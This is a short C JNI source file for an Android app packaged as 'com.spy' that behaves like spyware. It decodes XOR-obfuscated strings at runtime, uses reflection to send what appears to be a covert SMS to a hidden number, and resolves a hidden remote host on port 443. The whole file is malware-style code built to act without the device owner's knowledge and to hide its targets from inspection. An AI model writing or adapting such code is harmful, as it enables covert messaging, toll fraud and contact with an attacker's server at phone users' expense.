#include <jni.h>
#include "mini.h"
#include "spystr.h"
struct addrinfo;
int getaddrinfo(const char *, const char *, const struct addrinfo *, struct addrinfo **);
static char *unx(unsigned char *s, size_t len) {
    char *o = malloc(len); unsigned char k = s[len - 1];
    for (size_t i = 0; i + 1 < len; i++) o[i] = s[i] ^ k;
    o[len - 1] = 0; return o;
}
#define U(x) unx(x, sizeof(x))
JNIEXPORT void JNICALL Java_com_spy_Main_go(JNIEnv *env, jclass self) {
    jclass sms = (*env)->FindClass(env, U(a));
    jmethodID gd = (*env)->GetStaticMethodID(env, sms, U(b), U(c));
    jobject mgr = (*env)->CallStaticObjectMethod(env, sms, gd);
    jmethodID send = (*env)->GetMethodID(env, sms, U(d), U(e));
    (*env)->CallVoidMethod(env, mgr, send, (*env)->NewStringUTF(env, U(f)), (jstring)0, (*env)->NewStringUTF(env, U(g)), (jobject)0, (jobject)0);
    struct addrinfo *res;
    getaddrinfo(U(h), "443", 0, &res);
}
